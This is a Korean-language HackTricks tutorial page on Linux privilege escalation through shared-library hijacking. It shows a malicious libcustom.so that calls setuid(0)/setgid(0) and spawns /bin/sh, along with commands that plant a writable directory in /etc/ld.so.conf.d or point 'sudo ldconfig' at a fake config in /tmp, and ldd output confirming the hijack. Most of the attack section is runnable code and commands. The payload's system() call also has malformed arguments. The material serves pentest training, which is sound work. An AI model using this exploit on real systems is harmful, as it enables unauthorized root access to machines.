# ld.so privesc exploit example

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 환경 설정

다음 섹션에서는 환경을 설정하기 위해 사용할 파일의 코드를 찾을 수 있습니다.

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

```c
#include <stdio.h>

void vuln_func();
```

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```

{% tabs %}
{% tab title="Korean" %}
1. 동일한 폴더에 이러한 파일을 **생성**합니다.
2. **라이브러리를 컴파일**합니다: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`를 `/usr/lib`로 **복사**합니다: `sudo cp libcustom.so /usr/lib` (루트 권한)
4. **실행 파일을 컴파일**합니다: `gcc sharedvuln.c -o sharedvuln -lcustom`

#### 환경 확인

\_libcustom.so\_가 \_/usr/lib\_에서 **로드**되고 실행 파일을 **실행**할 수 있는지 확인합니다.
{% endtab %}
{% endtabs %}

```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

## Exploit

이 시나리오에서는 _/etc/ld.so.conf/_ 파일 내에 **취약한 항목을 생성한 사람**이 있다고 가정합니다:

```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```

취약한 폴더는 \_/home/ubuntu/lib\_입니다(쓰기 권한이 있는 곳입니다).\
다음 코드를 해당 경로에 **다운로드하고 컴파일**하세요:

```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```

이제 **잘못 구성된 경로 내에 악성 libcustom 라이브러리를 생성**했으므로, **재부팅**을 기다리거나 루트 사용자가 \*\*`ldconfig`\*\*를 실행하도록 기다려야 합니다. (_sudo로 이 바이너리를 실행할 수 있거나 suid 비트가 설정되어 있다면 직접 실행할 수 있을 것입니다_).

이 과정이 완료되면 `sharevuln` 실행 파일이 `libcustom.so` 라이브러리를 어디에서 로드하는지 **재확인**하세요.

```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

보시다시피 **`/home/ubuntu/lib`에서 로드**하고 있으며, 사용자가 실행하면 셸이 실행됩니다:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

{% hint style="info" %}
이 예제에서는 권한 상승을 하지 않았지만, 실행되는 명령을 수정하고 **루트 또는 다른 특권 사용자가 취약한 이진 파일을 실행하도록 기다린다면** 권한 상승이 가능합니다.
{% endhint %}

### 다른 구성 오류 - 동일한 취약점

이전 예제에서는 관리자가 `/etc/ld.so.conf.d/` 내부의 구성 파일에 **비특권 폴더를 설정한 것을 가장한** 구성 오류를 가짜로 만들었습니다.\
하지만 `/etc/ld.so.conf.d` 폴더 내의 **구성 파일** 또는 `/etc/ld.so.conf` 파일에 **쓰기 권한**이 있다면 동일한 취약점을 유발할 수 있는 다른 구성 오류가 있을 수 있습니다.

## Exploit 2

**`ldconfig`에 대한 sudo 권한이 있다고 가정해 봅시다**.\
`ldconfig`가 **어디에서 구성 파일을 로드할지를 지정**할 수 있으므로, 우리는 이를 이용하여 `ldconfig`가 임의의 폴더를 로드하도록 할 수 있습니다.\
그러므로, "/tmp"를 로드하기 위해 필요한 파일과 폴더를 생성해 봅시다:

```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

이제, **이전 공격**에서 나타난대로, **`/tmp` 디렉토리 안에 악성 라이브러리를 생성**합니다.\
마지막으로, 경로를 로드하고 이진 파일이 라이브러리를 어디에서 로드하는지 확인해 봅시다:

```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**sudo 권한을 통해 `ldconfig`에 대한 권한 상승 취약점을 악용할 수 있습니다.**

{% hint style="info" %}
`ldconfig`가 **suid 비트**로 구성된 경우 이 취약점을 신뢰할 수 있는 방법으로 악용할 수 없었습니다. 다음 오류가 발생합니다: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## 참고 자료

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTB의 Dab 머신

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
